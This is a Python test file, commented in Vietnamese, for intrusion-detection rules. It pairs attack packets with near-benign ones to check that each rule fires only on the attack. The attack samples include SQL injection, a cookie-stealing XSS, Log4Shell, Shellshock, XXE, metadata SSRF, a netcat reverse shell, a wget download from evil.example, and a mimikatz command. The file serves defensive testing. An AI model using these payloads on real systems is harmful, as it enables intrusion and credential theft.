"""Test cho các rule mở rộng phục vụ demo: mỗi rule có gói tấn công (phải bắn) và gói lành tính gần giống (không được bắn)."""
import pytest

from test_diverse_rules_engine import (
    make_http_packet,
    make_icmp_packet,
    make_tcp_packet,
    make_udp_packet,
    real_engine,  # noqa: F401  (fixture dùng chung)
)

HOST = {"host": "victim.local"}


def _hdr(**extra):
    return {**HOST, **extra}


# (sid, hàm dựng gói tấn công, hàm dựng gói lành tính)
STATELESS_CASES = [
    # ── WEB-ATTACK ──
    (1000031, lambda: make_http_packet(uri="/item?id=1+and+sleep(5)"),
              lambda: make_http_packet(uri="/shop/sleeping-bag")),
    (1000032, lambda: make_http_packet(uri="/q?x=1+union+select+table_name+from+information_schema.tables"),
              lambda: make_http_packet(uri="/docs/schema-information")),
    (1000033, lambda: make_http_packet(uri="/q?id=1;DROP+TABLE+users"),
              lambda: make_http_packet(uri="/drop-down/table.html")),
    (1000034, lambda: make_http_packet(uri="/q?x=<img+src=x+onerror=fetch('//e/'+document.cookie)>"),
              lambda: make_http_packet(uri="/q?x=cookie-recipes")),
    (1000035, lambda: make_http_packet(uri="/q?x=<iframe+src=//evil.example>"),
              lambda: make_http_packet(uri="/q?x=iframe-tutorial")),
    (1000036, lambda: make_http_packet(uri="/files/%2e%2e%2f%2e%2e%2fetc"),
              lambda: make_http_packet(uri="/files/2e-2e-2f")),
    (1000037, lambda: make_http_packet(uri="/index.php?page=php://filter/convert.base64-encode/resource=config"),
              lambda: make_http_packet(uri="/index.php?page=home")),
    (1000038, lambda: make_http_packet(uri="/index.php?page=http://evil.example/shell.txt"),
              lambda: make_http_packet(uri="/redirect?note=http_status_codes")),
    (1000039, lambda: make_http_packet(headers=_hdr(**{"x-api-version": "${jndi:ldap://evil.example/a}"})),
              lambda: make_http_packet(headers=_hdr(**{"x-api-version": "1.2.3"}))),
    (1000040, lambda: make_http_packet(headers=_hdr(**{"user-agent": "() { :;}; echo vulnerable"})),
              lambda: make_http_packet(headers=_hdr(**{"user-agent": "Mozilla/5.0 (X11; Linux)"}))),
    (1000041, lambda: make_http_packet(
                  method="POST", uri="/xml",
                  body='<?xml version="1.0"?><!DOCTYPE f [<!ENTITY x SYSTEM "file:///etc/hosts">]><f>&x;</f>'),
              lambda: make_http_packet(method="POST", uri="/xml", body="<f><name>An</name></f>")),
    (1000042, lambda: make_http_packet(uri="/fetch?url=http://169.254.169.254/latest/meta-data/"),
              lambda: make_http_packet(uri="/fetch?url=http://example.org/")),
    (1000043, lambda: make_http_packet(uri="/.git/config"),
              lambda: make_http_packet(uri="/github/about")),
    (1000044, lambda: make_http_packet(uri="/.env"),
              lambda: make_http_packet(uri="/env.js")),
    # ── SCAN ──
    (1000104, lambda: make_tcp_packet(flags="SR"),
              lambda: make_tcp_packet(flags="S")),
    (1000105, lambda: make_http_packet(headers=_hdr(**{"user-agent": "Mozilla/5.0 (compatible; Nmap Scripting Engine)"})),
              lambda: make_http_packet(headers=_hdr(**{"user-agent": "Mozilla/5.0"}))),
    (1000106, lambda: make_http_packet(headers=_hdr(**{"user-agent": "masscan/1.3"})),
              lambda: make_http_packet(headers=_hdr(**{"user-agent": "Mozilla/5.0"}))),
    # ── DOS ──
    (1000207, lambda: make_udp_packet(dport=53, payload=b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\xff\x00\x01"),
              lambda: make_udp_packet(dport=53, payload=b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01")),
    (1000208, lambda: make_udp_packet(dport=11211, payload=b"\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"),
              lambda: make_udp_packet(dport=11211, payload=b"\x00\x00\x00\x00\x00\x01\x00\x00get foo\r\n")),
    # ── MALWARE / C2 ──
    (1000406, lambda: make_tcp_packet(dport=4444, flags="PA", payload=b"nc 10.0.0.1 4444 -e /bin/sh"),
              lambda: make_tcp_packet(dport=4444, flags="PA", payload=b"nc -l 4444")),
    (1000407, lambda: make_tcp_packet(dport=4444, flags="PA", payload=b"wget http://evil.example/x.sh -O /tmp/x"),
              lambda: make_tcp_packet(dport=4444, flags="PA", payload=b"wget --version")),
    (1000408, lambda: make_tcp_packet(dport=4444, flags="PA", payload=b"import subprocess;subprocess.call([\"/bin/sh\"])"),
              lambda: make_tcp_packet(dport=4444, flags="PA", payload=b"import subprocess")),
    (1000409, lambda: make_tcp_packet(dport=4444, flags="PA", payload=b"mimikatz # sekurlsa::logonpasswords"),
              lambda: make_tcp_packet(dport=4444, flags="PA", payload=b"mimikatz is a tool")),
    (1000410, lambda: make_tcp_packet(dport=4444, flags="PA", payload=b"...EICAR-STANDARD-ANTIVIRUS-TEST-FILE!..."),
              lambda: make_tcp_packet(dport=4444, flags="PA", payload=b"STANDARD-ANTIVIRUS")),
    (1000411, lambda: make_tcp_packet(dport=3333, flags="PA", payload=b'{"id":1,"method":"mining.subscribe","params":[]}'),
              lambda: make_tcp_packet(dport=3333, flags="PA", payload=b'{"id":1,"method":"ping"}')),
    # ── RECON ──
    (1000504, lambda: make_icmp_packet(icmp_type=17),
              lambda: make_icmp_packet(icmp_type=8)),
    (1000505, lambda: make_udp_packet(dport=137, payload=b"\x80\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x20CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\x00\x21\x00\x01"),
              lambda: make_udp_packet(dport=137, payload=b"\x80\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x20HELLO\x00")),
    (1000506, lambda: make_tcp_packet(dport=53, flags="PA", payload=b"\x00\x1c\x12\x34\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\xfc\x00\x01"),
              lambda: make_tcp_packet(dport=53, flags="PA", payload=b"\x00\x1c\x12\x34\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01")),
    (1000507, lambda: make_udp_packet(dport=1900, payload=b"M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n\r\n"),
              lambda: make_udp_packet(dport=1900, payload=b"NOTIFY * HTTP/1.1\r\n\r\n")),
    (1000508, lambda: make_udp_packet(dport=53, payload=b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07version\x04bind\x00\x00\x10\x00\x03"),
              lambda: make_udp_packet(dport=53, payload=b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07version\x03app\x00\x00\x10\x00\x03")),
]


@pytest.mark.parametrize("sid,attack,benign", STATELESS_CASES, ids=[c[0] for c in STATELESS_CASES])
def test_rule_fires_on_attack(real_engine, sid, attack, benign):
    assert any(r.sid == sid for r in real_engine.evaluate_packet(attack())), f"SID {sid} phải bắn"


@pytest.mark.parametrize("sid,attack,benign", STATELESS_CASES, ids=[c[0] for c in STATELESS_CASES])
def test_rule_silent_on_benign(real_engine, sid, attack, benign):
    assert not any(r.sid == sid for r in real_engine.evaluate_packet(benign())), f"SID {sid} không được bắn"


# (sid, hàm dựng gói theo src_ip, số gói chưa được bắn)
# detection_filter: gói thứ count+1 mới bắn
FILTER_CASES = [
    (1000107, lambda ip: make_tcp_packet(src_ip=ip, flags="S", dport=8081), 20),
    (1000205, lambda ip: make_udp_packet(src_ip=ip, dst_ip="10.0.5.205", dport=9999, payload=b"x"), 50),
    (1000206, lambda ip: make_icmp_packet(src_ip=ip, dst_ip="10.0.5.206", payload=b"ping"), 20),
    (1000209, lambda ip: make_http_packet(src_ip=ip, uri="/"), 30),
    (1000305, lambda ip: make_tcp_packet(src_ip=ip, flags="S", dport=22), 5),
    (1000306, lambda ip: make_http_packet(src_ip=ip, method="POST", uri="/login", body="u=a&p=b"), 5),
    (1000307, lambda ip: make_tcp_packet(src_ip=ip, dport=21, flags="PA", payload=b"PASS secret\r\n"), 5),
]


@pytest.mark.parametrize("sid,build,quiet", FILTER_CASES, ids=[c[0] for c in FILTER_CASES])
def test_threshold_rule_fires_only_after_count(real_engine, sid, build, quiet):
    ip = f"203.0.113.{sid % 200}"
    for i in range(quiet):
        assert not any(r.sid == sid for r in real_engine.evaluate_packet(build(ip))), f"gói {i + 1} chưa được bắn"
    assert any(r.sid == sid for r in real_engine.evaluate_packet(build(ip)))


def test_ssh_brute_force_ignores_syn_ack(real_engine):
    pkt = make_tcp_packet(src_ip="203.0.113.250", flags="SA", dport=22)
    for _ in range(8):
        assert not any(r.sid == 1000305 for r in real_engine.evaluate_packet(pkt))
